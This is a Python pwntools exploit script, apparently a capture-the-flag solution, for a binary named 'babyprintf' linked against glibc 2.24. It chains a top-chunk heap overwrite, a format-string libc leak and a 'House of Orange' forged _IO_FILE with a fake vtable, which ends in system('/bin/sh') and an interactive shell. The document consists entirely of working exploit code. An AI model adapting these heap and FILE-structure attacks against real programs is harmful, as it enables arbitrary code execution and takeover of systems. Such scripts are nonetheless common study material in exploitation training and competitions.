#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./babyprintf'], env={'LD_PRELOAD':'./libc-2.24.so'})
libc = ELF('libc-2.24.so')

def prf(size, string):
    io.sendlineafter("size: ", str(size))
    io.sendlineafter("string: ", string)

def overwrite_top():
    payload  = "A" * 16
    payload += p64(0) + p64(0xfe1)              # top chunk header
    prf(0x10, payload)

def leak_libc():
    global libc_base

    prf(0x1000, '%p%p%p%p%p%pA')                # _int_free in sysmalloc
    libc_start_main = int(io.recvuntil("A", drop=True)[-12:], 16) - 241
    libc_base = libc_start_main - libc.symbols['__libc_start_main']

    log.info("libc_base address: 0x%x" % libc_base)

def house_of_orange():
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
    vtable_addr = libc_base + 0x3be4c0          # _IO_str_jumps

    log.info("_IO_list_all address: 0x%x" % io_list_all)
    log.info("system address: 0x%x" % system_addr)
    log.info("/bin/sh address: 0x%x" % bin_sh_addr)
    log.info("vtable address: 0x%x" % vtable_addr)

    stream  = p64(0) + p64(0x61)                # fake header   # fp
    stream += p64(0) + p64(io_list_all - 0x10)  # fake bk pointer
    stream += p64(0)                            # fp->_IO_write_base
    stream += p64(0xffffffff)                   # fp->_IO_write_ptr
    stream += p64(0) *2                         # fp->_IO_write_end, fp->_IO_buf_base
    stream += p64((bin_sh_addr - 100) / 2)      # fp->_IO_buf_end
    stream  = stream.ljust(0xc0, '\x00')
    stream += p64(0)                            # fp->_mode

    payload  = "A" * 0x10
    payload += stream
    payload += p64(0) * 2
    payload += p64(vtable_addr)                 # _IO_FILE_plus->vtable
    payload += p64(system_addr)
    prf(0x10, payload)

def pwn():
    io.sendline("0")        # abort routine
    io.interactive()

if __name__ == '__main__':
    overwrite_top()
    leak_libc()
    house_of_orange()
    pwn()
